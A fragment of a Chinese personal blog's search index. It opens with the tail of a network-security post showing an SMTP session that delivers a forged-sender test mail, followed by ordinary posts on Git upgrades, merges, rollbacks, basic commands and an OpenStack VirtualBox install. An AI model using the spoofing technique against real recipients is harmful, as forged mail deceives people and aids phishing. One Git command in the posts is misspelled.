b9yqaZaq6tcg48EWzGfuOT3uBs2aVp9W8Upf0MeSxPLVbpgEnzqMRjqlIhZaXAIe9kR1xg4V4IObPilZfBb4uYY0ayLTDcDDMXTc\n ->          GyjA==\n -> ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20160816;\n ->         h=subject:from:to:date:message-id;\n ->         bh=ecGWgWCJeWxJFeM0urOVWP+KOlqqvsQYKOpYUP8nk7I=;\n ->         b=ZHdmyDNpyMR/DCfW1heAmecEtINi+fb5Myr8+sjj1meh6oH0VhTZzvOCTylrp/WXlu\n ->          kGgDW2zzC95QeKAFF3ZbXClFoDVgEGECg2mTmQ2QUXB74qi5EDtu+X4izzxqjBZ+\n ->          m97oeNIBQoka40rvItwK8foHNSo3l6k55cpTvJ6+c1SvOz/eW5f0Im7dFpX3ELrioNMK\n ->          Kuvw==\n -> ARC-Authentication-Results: i=1; mx.google.com;\n ->        spf=temperror (google.com: error in processing during lookup of admin@saucer-man.com: DNS error) smtp.mailfrom=admin@saucer-man.com\n -> Return-Path: <admin@saucer-man.com>\n -> Received: from saucer-man.com ([003.11.50.2])\n ->         by mx.google.com with ESMTP id m6si9771129pld.54.2020.03.30.00.33.01\n ->         for <yixianosaurusphaaaga7096@gmail.com>;\n ->         Mon, 30 Mar 2020 00:33:01 -0700 (PDT)\n -> Received-SPF: temperror (google.com: error in processing during lookup of admin@saucer-man.com: DNS error) client-ip=003.11.50.2;\n -> Authentication-Results: mx.google.com;\n ->        spf=temperror (google.com: error in processing during lookup of admin@saucer-man.com: DNS error) smtp.mailfrom=admin@saucer-man.com\n -> Message-ID: <5e81a0ad.1c69fb81.18eb2.4993SMTPIN_ADDED_MISSING@mx.google.com>\n -> Date: Mon, 30 Mar 2020 15:32:58 +0800\n -> To: worktestnet321@163.com\n -> From: worktestnet321@163.com\n -> Subject: test mail\n -> X-Mailer: saucer-man.com\n -> \n -> 4008208820 DNC 橡果国际 新购物 新生活\n -> \n -> .\n<-  250 Mail OK queued as zwqz-mx-mta-g9-1,_____wBHQvQpOyxkxthYAA--.22943S2 1680620329\n -> QUIT\n<-  221 Bye\n=== Connection closed with remote host.\n```\n\n出现250的状态码发送成功，","tags":["网络安全"],"categories":["技术"]},{"title":"Ubuntu 升级Git版本","url":"/2023/03/26/ubuntu-update-git/","content":"\nUbuntu自己带的git的版本可以正常使用，但是出于对完美的追求，还是想将Git升级为相对高一点的版本。\n\n只需要依次执行以下代码就OK了。\n\n```bash\nsudo add-apt-repository ppa:git-core/ppa\nsudo apt-get update\nsudo apt-get install git\n```\n\n执行完事后，可以通过以下命令查看Git的版本。\n\n```bash\ngit --veision\n```\n\n<!-- more -->\n\n>节选自SCDN诸葛_瓜皮的文章\n>https://blog.csdn.net/Ezreal_King/article/details/79999131\n>记录本文章纯粹是为了之后自己方便寻找","tags":["Ubuntu","Git"],"categories":["探索"]},{"title":"Git 拒绝合并无关历史","url":"/2023/03/26/git-merge-error/","content":"\n### 问题描述\n\n可能是因为经常在两台电脑上开发的缘故吧，之间来回倒腾。在windows上开发了一些东西，又回到Ubuntu后，就应该是先进行git pull。没错，就应该是这样，然而在我进行git pull时，所有的进度都进行完成之后，出现了以下的报错。\n\n<!-- more -->\n\n```bash 折叠代码\n提示：您有偏离的分支，需要指定如何调和它们。您可以在执行下一次\n提示：pull 操作之前执行下面一条命令来抑制本消息：\n提示：\n提示：  git config pull.rebase false  # 合并\n提示：  git config pull.rebase true   # 变基\n提示：  git config pull.ff only       # 仅快进\n提示：\n提示：您可以将 \"git config\" 替换为 \"git config --global\" 以便为所有仓库设置\n提示：缺省的配置项。您也可以在每次执行 pull 命令时添加 --rebase、--no-rebase，\n提示：或者 --ff-only 参数覆盖缺省设置。\n致命错误：需要指定如何调和偏离的分支。\n```\n\n说实话我没怎么看懂这个报错，不过给了提示，我就跟着这个提示进行操作。结果：\n\n```bash\nknight@knight:~/blog/lxp731.github.io$ git config pull.rebase false\nknight@knight:~/blog/lxp731.github.io$ git pull\n致命错误：拒绝合并无关的历史\n```\n\n然后没办法上网查找看到这样的解决办法：\n\nPS:记得把“main”修改为自己想pull下来的分支\n\n### 解决办法\n\n```bash\ngit pull origin main --allow-unrelated-histories \n```\n\nPS:记得把“main”修改为自己想pull下来的分支\n\n由此问题解决!!!","tags":["Git"],"categories":["探索"]},{"title":"Git进阶操作--回滚代码","url":"/2023/03/24/git-rollback/","content":"\n### 问题描述\n\n可能是我之前的操作都太简单了，几乎都是一遍提交，从来没有遇到过回滚的情况，也没有进行深入的研究。直到今天，我把一次修改提交之后，发现博客网站全部乱码，倒也不是乱码，只是没有任何秩序可言，我当时只感脑壳一白。我是谁？我在哪？我在干什么？\n\n我真的不知道是做了什么修改，可能是因为修改时几次误操作，而且操作过那么多文件，要想一个一个去排查，几乎是不可能的。\n\n我想这可能就是Git之所以能够封神的原因之一吧，他支持项目的回滚。可以回到任何一个提交的修改点，就像是每次提交都像是给虚拟机拍了一个快照。\n\n那么进入今天的正题吧！！！\n\n<!-- more -->\n\n### 解决办法\n\n1. 首先在网站上把要恢复的Git-sha码复制下来\n\n![sha码](./git-rollback/1.png)\n\n2. 接下来回到终端执行\n\n```bash\ngit reset --hard commit_sha\n```\n\n把“commit_sha”换成刚刚复制下来的sha码，有时候在终端粘贴的时候会在末尾带一个\"~\"，要记得删掉。\n\n3. 最后强制提交更改\n\n```bash\ngit push origin HEAD --force\n```\n执行完项目就完成回滚了，学会这一招儿，你就可以尽情造作了，玩坏了就回滚，so easy!!!","tags":["Git"],"categories":["探索"]},{"title":"OpenStack在windows上安装教程","url":"/2023/03/19/openstack-install/","content":"\n### 项目准备\n\n1. 安装VirtualBOX\n\n> https://download.virtualbox.org/virtualbox/7.0.6/VirtualBox-7.0.6-155176-Win.exe\n\n2. 下载OpenStack的项目资源\n\nOpenStack https://www.aliyundrive.com/s/3uZc1uBwq24 提取码: m8zf\n\n如果是下载的这个网站提供的OpenStack项目资源，那么可以进行查看一下以下几个文件都应该已经存在了。\n\n<!-- more -->\n\n![](https://lxp731.github.io/img/openstack/1.png)\n\n### 开始安装\n\n1. 接下来修改几个文件的配置文件,全部换成自己电脑中VirtualBOX的绝对安装路径\n\n![](https://lxp731.github.io/img/openstack/modify_config.png)\n\n2. 完成后双击运行create_hostnet.bat脚本，出现succeeded字样安装完成。\n\n![](https://lxp731.github.io/img/openstack/succeeded.png)\n\n3. 打开VirtualBOX---管理---主机网络管理器，发现会多出来以下两个Adapter：\n\n![](https://lxp731.github.io/img/openstack/Adapter.png)\n\n4. 在virtualbox中导入.ova文件的虚拟机\n\nvirtualbox---管理---导入虚拟电脑，分别导入第一张图中的computer1.ova文件和controller.ova文件\n\n5. 运行虚拟电脑\n\n鼠标右击之后选择无页面启动就OK。\n\n### 体验OpenStack\n\n接着在浏览器输入```127.0.0.1:8888/horizon```回车\n\n默认OpenStack存在两个用户：\n\n\n|||\n|:--:|:--:|\n|user|password|\n|admin|admin_user_secret|\n|myuser|myuser_user_pass|","tags":["Openstack"],"categories":["探索"]},{"title":"Git 的基本操作","url":"/2023/03/13/git-basic-operation/","content":"\n添加修改到暂存区\n\n```git\ngit add .\n```\n\n添加提交说明\n\n```git\ngit commit -m \"modify file1\"\n```\n\n把本地修改推送到远程仓库\n\n<!-- more -->\n\n```git \ngit push origin main\n```\n>PS：main 代表是远程分支的名字，远程分支叫什么就填什么。\n\n克隆仓库\n\n```git \ngit clone \"your link\"\n```\n>PS：克隆下来的仓库和下载下来的源代码解压出来的效果是不一样的，最直接的不同是：克隆会产生一个隐藏的.git 文件，而解压不会产生这个文件。\n\n同步远程分支\n\n```git\ngit pull\n```\n\n删除push和fetch地址\n\n```git \ngit remote rm origin\n```\n\n添加push和fetch地址\n\n```git\ngit remote add origin\n```\n\n列出所有的分支(包括本地分支和远程分支)\n\n```git\ngit branch -a\n```\n\n在本地切换分支\n\n```git \ngit checkout \"branch name\"\n```\n\n在本地创建分支\n\n```git \ngit checkout -b \"branch name\"\n```\n\n>PS：这个命令在创建分支的同时也会将当前分支切换过去\n\n修改本地分支名字\n\n```git \ngit branch -m \"old branch name\" \"new branch name\"\n```\n\n删除本地分支\n\n```git\ngit branch -d \"branch name\"\n```\n\n删除远程分支\n\n```git \ngit push origin --delete \"remote branch name\"\n```","tags":["Git"],"categories":["探索"]}]